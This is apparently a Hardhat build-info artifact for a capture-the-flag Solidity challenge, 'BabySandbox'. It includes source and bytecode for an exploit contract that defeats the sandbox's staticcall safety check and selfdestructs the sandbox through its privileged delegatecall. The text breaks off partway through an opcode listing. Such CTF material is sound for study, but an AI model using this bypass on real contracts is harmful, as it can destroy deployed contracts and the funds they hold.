{
  "id": "97ffb25db9a25b80b034b8d68697e35a",
  "_format": "hh-sol-build-info-1",
  "solcVersion": "0.7.0",
  "solcLongVersion": "0.7.0+commit.9e61f92b",
  "input": {
    "language": "Solidity",
    "sources": {
      "contracts/babysandbox/ExploitBabySandbox.sol": {
        "content": "pragma solidity 0.7.0;\n\nimport \"./SetupBabySandbox.sol\";\n\ncontract Child {\n\n    Child private immutable self = this;\n\n    function check() external {\n        selfdestruct(msg.sender); \n    }    \n\n    fallback() external { \n       try self.check() {\n            selfdestruct(msg.sender); \n        } \n        catch {}\n    }\n}\n\ncontract ExploitBabySandbox {\n\n    address public child;\n    constructor() {\n        child = address(new Child());\n    }\n\n    function execute(SetupBabySandbox setup) external {\n        setup.sandbox().run(child);\n    }\n}"
      },
      "contracts/babysandbox/SetupBabySandbox.sol": {
        "content": "pragma solidity 0.7.0;\n\nimport \"./BabySandbox.sol\";\n\ncontract SetupBabySandbox {\n    BabySandbox public sandbox;\n    \n    constructor() {\n        sandbox = new BabySandbox();\n    }\n    \n    function isSolved() public view returns (bool) {\n        uint size;\n        assembly {\n            size := extcodesize(sload(sandbox.slot))\n        }\n        return size == 0;\n    }\n}\n"
      },
      "contracts/babysandbox/BabySandbox.sol": {
        "content": "pragma solidity 0.7.0;\n\ncontract BabySandbox {\n\n    function run(address code) external payable {\n        assembly {\n            // if we're calling ourselves, perform the privileged delegatecall\n\n            if eq(caller(), address()) {\n                switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)   \n                    case 0 {\n                        returndatacopy(0x00, 0x00, returndatasize())\n                        revert(0x00, returndatasize())\n                    }\n                    case 1 {\n                        returndatacopy(0x00, 0x00, returndatasize())\n                        return(0x00, returndatasize())\n                    }\n            }\n\n            // ensure enough gas\n            if lt(gas(), 0xf000) {\n                revert(0x00, 0x00)\n            }\n            \n            // load calldata\n            // \tCopy input data in current environment to memory\n            calldatacopy(0x00, 0x00, calldatasize())\n            \n            // run using staticcall\n            // if this fails, then the code is malicious because it tried to change state\n            // Get size of input data in current environment\n            if iszero(staticcall(0x4000, address(), 0, calldatasize(), 0, 0)) {\n                revert(0x00, 0x00)\n            }\n            \n            // if we got here, the code wasn't malicious\n            // run without staticcall since it's safe\n            switch call(0x4000, address(), 0, 0, calldatasize(), 0, 0)\n                case 0 {\n                    returndatacopy(0x00, 0x00, returndatasize())\n                    revert(0x00, returndatasize())\n                }\n                case 1 {\n                    returndatacopy(0x00, 0x00, returndatasize())\n                    return(0x00, returndatasize())\n                }\n         }\n         \n    }\n}\n"
      }
    },
    "settings": {
      "optimizer": {
        "enabled": false,
        "runs": 200
      },
      "outputSelection": {
        "*": {
          "*": [
            "abi",
            "evm.bytecode",
            "evm.deployedBytecode",
            "evm.methodIdentifiers",
            "metadata"
          ],
          "": [
            "ast"
          ]
        }
      }
    }
  },
  "output": {
    "contracts": {
      "contracts/babysandbox/BabySandbox.sol": {
        "BabySandbox": {
          "abi": [
            {
              "inputs": [
                {
                  "internalType": "address",
                  "name": "code",
                  "type": "address"
                }
              ],
              "name": "run",
              "outputs": [],
              "stateMutability": "payable",
              "type": "function"
            }
          ],
          "evm": {
            "bytecode": {
              "linkReferences": {},
              "object": "608060405234801561001057600080fd5b5061012c806100206000396000f3fe608060405260043610601c5760003560e01c8063522bb704146021575b600080fd5b606060048036036020811015603557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506062565b005b30331415609a57600080600080845af46000811460845760018114608e576098565b3d6000803e3d6000fd5b3d6000803e3d6000f35b505b61f0005a101560a857600080fd5b366000803760008036600030614000fa60c057600080fd5b6000803660008030614000f16000811460de576001811460e85760f2565b3d6000803e3d6000fd5b3d6000803e3d6000f35b505056fea26469706673582212208fdbfa6bf9f1f15affb8fe6a162950ff955101325b72cf5bdf47ed43fa92eb7464736f6c63430007000033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x12C DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x522BB704 EQ PUSH1 0x21 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x35 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x62 JUMP JUMPDEST STOP JUMPDEST ADDRESS CALLER EQ ISZERO PUSH1 0x9A JUMPI PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 DUP5 GAS DELEGATECALL PUSH1 0x0 DUP2 EQ PUSH1 0x84 JUMPI PUSH1 0x1 DUP2 EQ PUSH1 0x8E JUMPI PUSH1 0x98 JUMP JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 RETURN JUMPDEST POP JUMPDEST PUSH2 0xF000 GAS LT ISZERO PUSH1 0xA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH1 0x0 DUP1 CALLDATACOPY PUSH1 0x0 DUP1 CALLDATASIZE PUSH1 0x0 ADDRESS PUSH2 0x4000 STATICCALL PUSH1 0xC0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 CALLDATASIZE PUSH1 0x0 DUP1 ADDRESS PUSH2 0x4000 CALL PUSH1 0x0 DUP2 EQ PUSH1 0xDE JUMPI PUSH1 0x1 DUP2 EQ PUSH1 0xE8 JUMPI PUSH1 0xF2 JUMP JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 RETURN JUMPDEST POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP16 0xDB STATICCALL PUSH12 0xF9F1F15AFFB8FE6A162950FF SWAP6 MLOAD ADD ORIGIN JUMPDEST PUSH19 0xCF5BDF47ED43FA92EB7464736F6C6343000700 STOP CALLER ",
              "sourceMap": "24:1802:0:-:0;;;;;;;;;;;;;;;;;;;"
            },
            "deployedBytecode": {
              "immutableReferences": {},
              "linkReferences": {},
              "object": "608060405260043610601c5760003560e01c8063522bb704146021575b600080fd5b606060048036036020811015603557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506062565b005b30331415609a57600080600080845af46000811460845760018114608e576098565b3d6000803e3d6000fd5b3d6000803e3d6000f35b505b61f0005a101560a857600080fd5b366000803760008036600030614000fa60c057600080fd5b6000803660008030614000f16000811460de576001811460e85760f2565b3d6000803e3d6000fd5b3d6000803e3d6000f35b505056fea26469706673582212208fdbfa6bf9f1f15affb8fe6a162950ff955101325b72cf5bdf47ed43fa92eb7464736f6c63430007000033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x522BB704 EQ PUSH1 0x21 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x35 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x62 JUMP JUMPDEST STOP JUMPDEST ADDRESS CALLER EQ ISZERO PUSH1 0x9A JUMPI PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 DUP5 GAS DELEGATECALL PUSH1 0x0 DUP2 EQ PUSH1 0x84 JUMPI PUSH1 0x1 DUP2 EQ PUSH1 0x8E JUMPI PUSH1 0x98 JUMP JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 RETURN JUMPDEST POP JUMPDEST PUSH2 0xF000 GAS LT ISZERO PUSH1 0xA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH1 0x0 DUP1 CALLDATACOPY PUSH1 0x0 DUP1 CALLDATASIZE PUSH1 0x0 ADDRESS PUSH2 0x4000 STATICCALL PUSH1 0xC0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 CALLDATASIZE PUSH1 0x0 DUP1 ADDRESS PUSH2 0x4000 CALL PUSH1 0x0 DUP2 EQ PUSH1 0xDE JUMPI PUSH1 0x1 DUP2 EQ PUSH1 0xE8 JUMPI PUSH1 0xF2 JUMP JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 RETURN JUMPDEST POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP16 0xDB STATICCALL PUSH12 0xF9F1F15AFFB8FE6A162950FF SWAP6 MLOAD ADD ORIGIN JUMPDEST PUSH19 0xCF5BDF47ED43FA92EB7464736F6C6343000700 STOP CALLER ",
              "sourceMap": "24:1802:0:-:0;;;;;;;;;;;;;;;;;;;;;52:1772;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;225:9;215:8;212:23;209:2;;;305:4;299;293;287;281;274:5;261:49;339:1;334:154;;;;514:1;509:154;;;;254:409;;334:154;394:16;388:4;382;367:44;449:16;443:4;436:30;509:154;569:16;563:4;557;542:44;624:16;618:4;611:30;254:409;;209:2;737:6;730:5;727:17;724:2;;;776:4;770;763:18;724:2;940:14;934:4;928;915:40;1230:1;1227;1211:14;1208:1;1197:9;1189:6;1178:54;1168:2;;1265:4;1259;1252:18;1168:2;1477:1;1474;1458:14;1455:1;1452;1441:9;1433:6;1428:51;1501:1;1496:142;;;;1660:1;1655:142;;;;1421:376;;1496:142;1552:16;1546:4;1540;1525:44;1603:16;1597:4;1590:30;1655:142;1711:16;1705:4;1699;1684:44;1762:16;1756:4;1749:30;1421:376;;115:1693;:::o"
            },
            "methodIdentifiers": {
              "run(address)": "522bb704"
            }
          },
          "metadata": "{\"compiler\":{\"version\":\"0.7.0+commit.9e61f92b\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"code\",\"type\":\"address\"}],\"name\":\"run\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/babysandbox/BabySandbox.sol\":\"BabySandbox\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/babysandbox/BabySandbox.sol\":{\"keccak256\":\"0xd471950f4b2de4ecd74016698d51a3283a1d70a22e8670b06327e8a9966c3f74\",\"urls\":[\"bzz-raw://3f29a6c4c38b242f62b184ab36cdad9d5c9c2d16928e938b33375428a83a71f1\",\"dweb:/ipfs/QmQmxLEShHreuiZH3GLroo4bHfBF5HRLmbvc72C13wL8Sz\"]}},\"version\":1}"
        }
      },
      "contracts/babysandbox/ExploitBabySandbox.sol": {
        "Child": {
          "abi": [
            {
              "stateMutability": "nonpayable",
              "type": "fallback"
            },
            {
              "inputs": [],
              "name": "check",
              "outputs": [],
              "stateMutability": "nonpayable",
              "type": "function"
            }
          ],
          "evm": {
            "bytecode": {
              "linkReferences": {},
              "object": "60a06040523073ffffffffffffffffffffffffffffffffffffffff1660809073ffffffffffffffffffffffffffffffffffffffff1660601b81525034801561004657600080fd5b5060805160601c61011c61006360003980602e525061011c6000f3fe6080604052348015600f57600080fd5b5060043610602b5760003560e01c8063919840ad1460c557602c565b5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663919840ad6040518163ffffffff1660e01b8152600401600060405180830381600087803b158015609357600080fd5b505af192505050801560a3575060015b60aa5760c3565b3373ffffffffffffffffffffffffffffffffffffffff16ff5b005b60cb60cd565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212209c0377ee8bfa8b1defaf71a01da3715a154dc74eab395160d68838fb074f0d5864736f6c63430007000033",
              "opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x46 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x80 MLOAD PUSH1 0x60 SHR PUSH2 0x11C PUSH2 0x63 PUSH1 0x0 CODECOPY DUP1 PUSH1 0x2E MSTORE POP PUSH2 0x11C PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x919840AD EQ PUSH1 0xC5 JUMPI PUSH1 0x2C JUMP JUMPDEST JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x919840AD PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0x93 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH1 0xA3 JUMPI POP PUSH1 0x1 JUMPDEST PUSH1 0xAA JUMPI PUSH1 0xC3 JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST STOP JUMPDEST PUSH1 0xCB PUSH1 0xCD JUMP JUMPDEST STOP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP13 SUB PUSH24 0xEE8BFA8B1DEFAF71A01DA3715A154DC74EAB395160D68838 0xFB SMOD 0x4F 0xD PC PUSH5 0x736F6C6343 STOP SMOD STOP STOP CALLER ",
              "sourceMap": "58:265:1:-:0;;;111:4;80:35;;;;;;;;;;;58:265;;;;;;;;;;;;;;;;;;;;;"
            },
            "deployedBytecode": {
              "immutableReferences": {
                "15": [
                  {
                    "length": 32,
                    "start": 46
                  }
                ]
              },
              "linkReferences": {},
              "object": "6080604052348015600f57600080fd5b5060043610602b5760003560e01c8063919840ad1460c557602c565b5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663919840ad6040518163ffffffff1660e01b8152600401600060405180830381600087803b158015609357600080fd5b505af192505050801560a3575060015b60aa5760c3565b3373ffffffffffffffffffffffffffffffffffffffff16ff5b005b60cb60cd565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212209c0377ee8bfa8b1defaf71a01da3715a154dc74eab395160d68838fb074f0d5864736f6c63430007000033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x919840AD EQ PUSH1 0xC5 JUMPI PUSH1 0x2C JUMP JUMPDEST JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x919840AD PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH1 0x93 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH1 0xA3 JUMPI POP PUSH1 0x1 JUMPDEST PUSH1 0xAA JUMPI PUSH1 0xC3 JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST STOP JUMPDEST PUSH1 0xCB PUSH1 0xCD JUMP JUMPDEST STOP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP13 SUB PUSH24 0xEE8BFA8B1DEFAF71A01DA3715A154DC74EAB395160D68838 0xFB SMOD 0x4F 0xD PC PUSH5 0x736F6C6343 STOP SMOD STOP STOP CALLER ",
              "sourceMap": "58:265:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;234:4;:10;;;:12;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;230:85;;;;;274:10;261:24;;;230:85;58:265;122:68;;;:::i;:::-;;;171:10;158:24;;"
            },
            "methodIdentifiers": {
              "check()": "919840ad"
            }
          },
          "metadata": "{\"compiler\":{\"version\":\"0.7.0+commit.9e61f92b\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"check\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/babysandbox/ExploitBabySandbox.sol\":\"Child\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/babysandbox/BabySandbox.sol\":{\"keccak256\":\"0xd471950f4b2de4ecd74016698d51a3283a1d70a22e8670b06327e8a9966c3f74\",\"urls\":[\"bzz-raw://3f29a6c4c38b242f62b184ab36cdad9d5c9c2d16928e938b33375428a83a71f1\",\"dweb:/ipfs/QmQmxLEShHreuiZH3GLroo4bHfBF5HRLmbvc72C13wL8Sz\"]},\"contracts/babysandbox/ExploitBabySandbox.sol\":{\"keccak256\":\"0x1b1a7fb4364797aee858c38ca7a21579e6a194093bd34f129fbcb10f28d46e34\",\"urls\":[\"bzz-raw://a181aee1a9f1eb0396188875db45e5a42c46c0658df66c02f4d1ead5b525f875\",\"dweb:/ipfs/QmUBDujyogDiT4EoHwrEYpkMyuoQ7u37kWYvZUXXUAeG28\"]},\"contracts/babysandbox/SetupBabySandbox.sol\":{\"keccak256\":\"0x3b0af79501ec145ce8fce82ffece485adacd0fb923a23704e9b6713fcf68dfa7\",\"urls\":[\"bzz-raw://39eb3e003ac70a4c076fa9fea1636f9f1416ef27b29ece0c8e284d43cab723fb\",\"dweb:/ipfs/QmQoLyMQD3GsbGdGJWt3UTHDBZJB8JZBqmnnJJrM6JM73g\"]}},\"version\":1}"
        },
        "ExploitBabySandbox": {
          "abi": [
            {
              "inputs": [],
              "stateMutability": "nonpayable",
              "type": "constructor"
            },
            {
              "inputs": [],
              "name": "child",
              "outputs": [
                {
                  "internalType": "address",
                  "name": "",
                  "type": "address"
                }
              ],
              "stateMutability": "view",
              "type": "function"
            },
            {
              "inputs": [
                {
                  "internalType": "contract SetupBabySandbox",
                  "name": "setup",
                  "type": "address"
                }
              ],
              "name": "execute",
              "outputs": [],
              "stateMutability": "nonpayable",
              "type": "function"
            }
          ],
          "evm": {
            "bytecode": {
              "linkReferences": {},
              "object": "608060405234801561001057600080fd5b5060405161001d9061007e565b604051809103906000f080158015610039573d6000803e3d6000fd5b506000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061008b565b61017f806102cb83390190565b6102318061009a6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063237b5e961461003b5780634b64e4921461006f575b600080fd5b6100436100b3565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6100b16004803603602081101561008557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506100d7565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8073ffffffffffffffffffffffffffffffffffffffff16631984916f6040518163ffffffff1660e01b815260040160206040518083038186803b15801561011d57600080fd5b505afa158015610131573d6000803e3d6000fd5b505050506040513d602081101561014757600080fd5b810190808051906020019092919050505073ffffffffffffffffffffffffffffffffffffffff1663522bb70460008054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b1580156101e057600080fd5b505af11580156101f4573d6000803e3d6000fd5b505050505056fea264697066735822122009764e212eed15b7d9534f38b6b9ef8bebe06b12e702443489a057d11551292f64736f6c6343000700003360a06040523073ffffffffffffffffffffffffffffffffffffffff1660809073ffffffffffffffffffffffffffffffffffffffff1660601b81525034801561004657600080fd5b5060805160601c61011c61006360003980602e525061011c6000f3fe6080604052348015600f57600080fd5b5060043610602b5760003560e01c8063919840ad1460c557602c565b5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663919840ad6040518163ffffffff1660e01b8152600401600060405180830381600087803b158015609357600080fd5b505af192505050801560a3575060015b60aa5760c3565b3373ffffffffffffffffffffffffffffffffffffffff16ff5b005b60cb60cd565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212209c0377ee8bfa8b1defaf71a01da3715a154dc74eab395160d68838fb074f0d5864736f6c63430007000033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x1D SWAP1 PUSH2 0x7E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x39 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x8B JUMP JUMPDEST PUSH2 0x17F DUP1 PUSH2 0x2CB DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH2 0x231 DUP1 PUSH2 0x9A PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x237B5E96 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x4B64E492 EQ PUSH2 0x6F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0xB3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xB1 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x85 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xD7 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1984916F PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x131 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x522BB704 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1F4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MULMOD PUSH23 0x4E212EED15B7D9534F38B6B9EF8BEBE06B12E702443489 LOG0 JUMPI 0xD1 ISZERO MLOAD 0x29 0x2F PUSH5 0x736F6C6343 STOP SMOD STOP STOP CALLER PUSH1 0xA0 PUSH1 0x40 MSTORE ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x46 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x80 MLOAD PUSH1 0x60 